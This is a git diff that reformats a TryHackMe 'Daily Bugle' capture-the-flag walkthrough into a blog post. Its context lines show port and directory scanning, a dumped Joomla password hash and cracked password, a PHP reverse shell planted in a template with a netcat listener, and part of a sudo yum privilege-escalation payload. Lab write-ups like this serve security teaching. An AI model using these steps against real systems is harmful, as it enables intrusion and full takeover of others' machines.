@@ -1,6 +1,10 @@
-# TryHackMe – Daily Bugle Walkthrough
+---
+title: "TryHackMe – Daily Bugle Walkthrough"
+categories: [Writeups]
+tags: [TryHackMe, Joomla, SQLi, Cracking, Yum, Privilege Escalation]
+---
 
-![image.png](image.png)
+![image.png](assets/img/posts/tryhackme/daily_bugle/image.png)
 
 ## Introduction
 
@@ -10,13 +14,13 @@ The **Daily Bugle** room on TryHackMe drops you into the middle of a Red Team in
 
 As always, the first step is to identify the exposed ports on the target.
 
-```json
+```bash
 nmap 10.64.149.242 -sT -T5 -vvv -p-
 ```
 
 Result:
 
-```json
+```
 PORT     STATE SERVICE REASON
 22/tcp   open  ssh     syn-ack
 80/tcp   open  http    syn-ack
@@ -33,13 +37,13 @@ Three services stand out:
 
 Next, we enumerate versions:
 
-```json
+```bash
 nmap 10.64.149.242 -sV -T5 -vvv -p 22,80,3306
 ```
 
 Result:
 
-```json
+```
 PORT     STATE SERVICE REASON         VERSION
 22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 7.4 (protocol 2.0)
 80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
@@ -52,11 +56,11 @@ The presence of Apache with PHP suggests a CMS-driven web application.
 
 Opening `http://10.64.149.242` in the browser reveals a website.
 
-![image.png](image%201.png)
+![image.png](assets/img/posts/tryhackme/daily_bugle/image%201.png)
 
 To understand its structure, I performed directory brute-forcing:
 
-```json
+```bash
 gobuster dir -u http://10.64.149.242 \
 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
 -x php,html,js,txt
@@ -76,7 +80,7 @@ Results:
 
 Visiting `/administrator` presented us with the Joomla admin login page.
 
-![image.png](image%202.png)
+![image.png](assets/img/posts/tryhackme/daily_bugle/image%202.png)
 
 Checking `/README.txt` reveals:
 
@@ -98,7 +102,7 @@ Running it against the target dumps sensitive information from the Joomla databa
 
 Running it against the target dumps sensitive Joomla data, including user hashes:
 
-```json
+```bash
 jonah@tryhackme.com:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
 ```
 
@@ -127,17 +131,17 @@ Password: spiderman123
 
 Using the cracked credentials, we successfully log into the Joomla administrator panel:
 
-```
+```http
 http://10.64.149.242/administrator
 ```
 
-![image.png](image%203.png)
+![image.png](assets/img/posts/tryhackme/daily_bugle/image%203.png)
 
 ## Gaining a Reverse Shell
 
 Once inside, I navigated to **Extensions > Templates > Templates** and selected the **Beez3** template.
 
-![image.png](image%204.png)
+![image.png](assets/img/posts/tryhackme/daily_bugle/image%204.png)
 
 Generated a PHP reverse shell from the web
 
@@ -145,23 +149,23 @@ Generated a PHP reverse shell from the web
 
 Inserted the payload on the `index.php`
 
-![image.png](image%205.png)
+![image.png](assets/img/posts/tryhackme/daily_bugle/image%205.png)
 
 I set up a listener:
 
-```json
+```bash
 nc -lnvp 4444
 ```
 
 Triggered the shell by visiting:
 
-```json
+```http
 http://10.64.176.202/templates/beez3/index.php
 ```
 
 We receive a shell as the Apache user:
 
-![image.png](image%206.png)
+![image.png](assets/img/posts/tryhackme/daily_bugle/image%206.png)
 
 ## Credential Harvesting
 
@@ -202,11 +206,11 @@ nv5uz9r3ZEDzVjNu
 
 Login is successful.
 
-![image.png](image%207.png)
+![image.png](assets/img/posts/tryhackme/daily_bugle/image%207.png)
 
 Retrieved the user flag:
 
-```json
+```bash
 cat user.txt 
 27a............42e
 ```
@@ -229,7 +233,7 @@ Allowing unrestricted `yum` execution as root is extremely dangerous.
 
 With a google search i found a payload to use the escalate privileges using yum
 
-```json
+```bash
 TF=$(mktemp -d)
 cat >$TF/x<<EOF
 [main]
@@ -257,7 +261,7 @@ sudo yum -c $TF/x --enableplugin=y
 
 With that i was able to get a root shell
 
-![image.png](image%208.png)
+![image.png](assets/img/posts/tryhackme/daily_bugle/image%208.png)
 
 Captured the root flag:
 
